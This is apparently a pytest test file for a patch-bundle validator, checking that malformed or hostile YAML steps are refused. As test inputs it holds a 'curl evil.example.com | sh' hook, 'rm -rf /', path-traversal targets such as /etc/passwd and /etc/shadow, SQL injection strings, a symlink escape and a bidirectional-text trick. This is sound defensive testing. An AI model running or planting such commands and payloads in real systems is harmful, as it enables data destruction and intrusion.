import os
import textwrap

import pytest

from fleet_rollout.spec import (
    AppendBlock,
    RunCommand,
    SqlUpsert,
    WriteFile,
    load_patch,
    parse_patch,
)
from fleet_rollout.validation import ValidationError

GOOD = """\
id: support-greeting-v2
description: New support greeting, a refund rule and the v2 invoice template
steps:
  - kind: write_file
    source: files/greeting.txt
    dest: config/greeting.txt
    expect_sha256: {pre}
  - kind: write_file
    source: files/invoices.py
    dest: handlers/invoices.py
  - kind: append_block
    source: files/refund-rule.md
    dest: prompts/support.md
    marker: "<!-- rule: refunds-v2 -->"
  - kind: sql_upsert
    db: data/settings.db
    table: settings
    key_column: name
    key: invoice_template
    values: {{value: v2, rev: 2}}
  - kind: run
    command: reload_agent
verify:
  - file: config/greeting.txt
    contains: Thanks for reaching out
"""


@pytest.fixture
def bundle(tmp_path):
    files = tmp_path / "files"
    files.mkdir()
    (files / "greeting.txt").write_bytes(b"Thanks for reaching out to Example Bakery support!\n")
    (files / "invoices.py").write_bytes(b"def total(lines):\n    return sum(lines)\n")
    (files / "refund-rule.md").write_bytes(b"Refunds over $50 need a manager.\n")
    return tmp_path


def write_spec(bundle, text=None, name="support-greeting-v2.yaml", pre="a" * 64):
    path = bundle / name
    path.write_text(text if text is not None else GOOD.format(pre=pre), encoding="utf-8")
    return path


def test_a_valid_patch_loads_every_step_kind(bundle):
    patch = load_patch(write_spec(bundle))
    assert patch.id == "support-greeting-v2"
    kinds = [type(s) for s in patch.steps]
    assert kinds == [WriteFile, WriteFile, AppendBlock, SqlUpsert, RunCommand]
    greeting = patch.steps[0]
    assert greeting.dest == "config/greeting.txt"
    assert greeting.content.startswith(b"Thanks for reaching out")
    assert greeting.expect_sha256 == "a" * 64
    assert patch.steps[1].needs_compile is True
    assert patch.steps[0].needs_compile is False
    assert patch.steps[3].values == (("value", "v2"), ("rev", 2))
    assert patch.steps[4].command.name == "reload_agent"
    assert patch.verify[0].file == "config/greeting.txt"
    assert patch.written_paths() == ["config/greeting.txt", "handlers/invoices.py",
                                     "prompts/support.md", "data/settings.db"]


def test_digest_is_stable_and_covers_the_bundle_bytes(bundle):
    first = load_patch(write_spec(bundle)).digest
    assert load_patch(write_spec(bundle)).digest == first
    (bundle / "files" / "greeting.txt").write_bytes(b"Thanks for reaching out!!\n")
    assert load_patch(write_spec(bundle)).digest != first


def test_digest_changes_when_a_step_changes(bundle):
    first = load_patch(write_spec(bundle)).digest
    assert load_patch(write_spec(bundle, pre="b" * 64)).digest != first


def test_id_must_match_the_file_name(bundle):
    path = write_spec(bundle, name="other-name.yaml")
    with pytest.raises(ValidationError, match="does not match its file name"):
        load_patch(path)


def test_hostile_yaml_is_refused_at_load(bundle):
    text = GOOD.format(pre="a" * 64).replace(
        "    dest: config/greeting.txt\n",
        "    dest: config/greeting.txt\n    dest: ../../etc/passwd\n", 1)
    with pytest.raises(ValidationError, match="duplicate key 'dest'"):
        load_patch(write_spec(bundle, text))


def doc(**overrides):
    base = {"id": "demo-patch", "description": "demo", "steps": [
        {"kind": "write_file", "source": "files/greeting.txt", "dest": "config/greeting.txt"}]}
    base.update(overrides)
    return base


def parse(bundle, data):
    return parse_patch(data, bundle_dir=bundle, source="demo-patch.yaml")


def test_unknown_top_level_keys_are_refused(bundle):
    with pytest.raises(ValidationError, match="unknown key"):
        parse(bundle, doc(post_install="curl evil.example.com | sh"))


def test_unknown_step_kind_is_refused(bundle):
    with pytest.raises(ValidationError, match="unknown step kind 'shell'"):
        parse(bundle, doc(steps=[{"kind": "shell", "script": "rm -rf /"}]))


def test_unknown_keys_inside_a_step_are_refused(bundle):
    step = {"kind": "write_file", "source": "files/greeting.txt", "dest": "config/g.txt",
            "mode": "4755"}
    with pytest.raises(ValidationError, match=r"steps\[0\].*unknown key\(s\) 'mode'"):
        parse(bundle, doc(steps=[step]))


@pytest.mark.parametrize("dest", ["../outside.txt", "/etc/passwd", "config/../../x",
                                  "config/a b.txt", ".fleet-rollout/applied/x.json"])
def test_destination_escapes_are_refused(bundle, dest):
    step = {"kind": "write_file", "source": "files/greeting.txt", "dest": dest}
    with pytest.raises(ValidationError, match=r"steps\[0\]\.dest"):
        parse(bundle, doc(steps=[step]))


@pytest.mark.parametrize("source", ["../secrets.txt", "/etc/shadow", "files/../../x"])
def test_source_escapes_are_refused(bundle, source):
    step = {"kind": "write_file", "source": source, "dest": "config/g.txt"}
    with pytest.raises(ValidationError, match=r"steps\[0\]\.source"):
        parse(bundle, doc(steps=[step]))


def link_dir(link, target):
    """A directory symlink, or an NTFS junction where symlinks need privileges."""
    try:
        os.symlink(target, link, target_is_directory=True)
    except OSError:
        if os.name != "nt":
            raise
        import _winapi
        _winapi.CreateJunction(str(target), str(link))


def test_a_source_behind_a_symlinked_directory_is_refused(bundle, tmp_path_factory):
    outside = tmp_path_factory.mktemp("outside")
    (outside / "secret.txt").write_text("operator credentials")
    link_dir(bundle / "files" / "shared", outside)
    step = {"kind": "write_file", "source": "files/shared/secret.txt", "dest": "config/g.txt"}
    with pytest.raises(ValidationError, match="outside the patch bundle"):
        parse(bundle, doc(steps=[step]))


def test_a_missing_source_file_is_refused_before_anything_runs(bundle):
    step = {"kind": "write_file", "source": "files/nope.txt", "dest": "config/g.txt"}
    with pytest.raises(ValidationError, match="does not exist"):
        parse(bundle, doc(steps=[step]))


def test_oversized_source_files_are_refused(bundle):
    (bundle / "files" / "big.bin").write_bytes(b"x" * (1024 * 1024 + 1))
    step = {"kind": "write_file", "source": "files/big.bin", "dest": "config/big.bin"}
    with pytest.raises(ValidationError, match="larger than"):
        parse(bundle, doc(steps=[step]))


def test_two_steps_may_not_write_the_same_file(bundle):
    steps = [{"kind": "write_file", "source": "files/greeting.txt", "dest": "config/g.txt"},
             {"kind": "append_block", "source": "files/refund-rule.md", "dest": "config/g.txt",
              "marker": "<!-- rule: refunds-v2 -->"}]
    with pytest.raises(ValidationError, match=r"steps\[1\].*already written by steps\[0\]"):
        parse(bundle, doc(steps=steps))


def test_a_py_source_is_compile_checked_even_with_a_suffixless_destination(bundle):
    step = {"kind": "write_file", "source": "files/invoices.py", "dest": "bin/invoice-total"}
    patch = parse(bundle, doc(steps=[step]))
    assert patch.steps[0].needs_compile is True


def test_steps_must_be_a_non_empty_list(bundle):
    with pytest.raises(ValidationError, match="non-empty list"):
        parse(bundle, doc(steps=[]))


def sql_step(**overrides):
    step = {"kind": "sql_upsert", "db": "data/settings.db", "table": "settings",
            "key_column": "name", "key": "invoice_template", "values": {"value": "v2"}}
    step.update(overrides)
    return step


@pytest.mark.parametrize("overrides, reason", [
    ({"table": "settings; DROP TABLE users"}, "SQL identifier"),
    ({"key_column": "name OR 1=1"}, "SQL identifier"),
    ({"values": {"value = 'x'; --": "y"}}, "SQL identifier"),
    ({"values": {"enabled": False}}, "quote it"),
    ({"values": {"value": None}}, "string or a number"),
    ({"values": {"value": ["a"]}}, "string or a number"),
    ({"values": {}}, "non-empty"),
    ({"values": {"name": "dup"}}, "key column"),
    ({"key": True}, "quote it"),
    ({"values": {"value": "nul\x00byte"}}, "NUL"),
])
def test_sql_upsert_fields_are_allowlisted(bundle, overrides, reason):
    with pytest.raises(ValidationError, match=reason):
        parse(bundle, doc(steps=[sql_step(**overrides)]))


def test_run_steps_only_reach_the_allowlist(bundle):
    with pytest.raises(ValidationError, match="not on the command allowlist"):
        parse(bundle, doc(steps=[{"kind": "run", "command": "bash", "args": ["-c", "id"]}]))


def test_append_markers_must_be_distinctive(bundle):
    step = {"kind": "append_block", "source": "files/refund-rule.md", "dest": "prompts/s.md",
            "marker": "# x"}
    with pytest.raises(ValidationError, match="at least 8"):
        parse(bundle, doc(steps=[step]))


def test_an_append_block_may_not_contain_its_own_marker(bundle):
    (bundle / "files" / "rule.md").write_text("<!-- rule: refunds-v2 -->\nbody\n")
    step = {"kind": "append_block", "source": "files/rule.md", "dest": "prompts/s.md",
            "marker": "<!-- rule: refunds-v2 -->"}
    with pytest.raises(ValidationError, match="already contains its marker"):
        parse(bundle, doc(steps=[step]))


def test_verify_entries_are_validated(bundle):
    with pytest.raises(ValidationError, match=r"verify\[0\]\.file"):
        parse(bundle, doc(verify=[{"file": "../../etc/passwd", "contains": "root"}]))
    with pytest.raises(ValidationError, match=r"verify\[0\]\.contains"):
        parse(bundle, doc(verify=[{"file": "config/g.txt", "contains": "two\nlines"}]))


def test_description_rejects_hidden_text(bundle):
    with pytest.raises(ValidationError, match="bidirectional"):
        parse(bundle, doc(description="harmless ‮exe.tpircs"))


def test_the_patch_spec_never_needs_more_than_its_documented_fields(bundle):
    patch = parse(bundle, doc())
    assert patch.verify == ()
    assert patch.source == "demo-patch.yaml"
    assert textwrap.dedent(patch.steps[0].label) == "write_file config/greeting.txt"
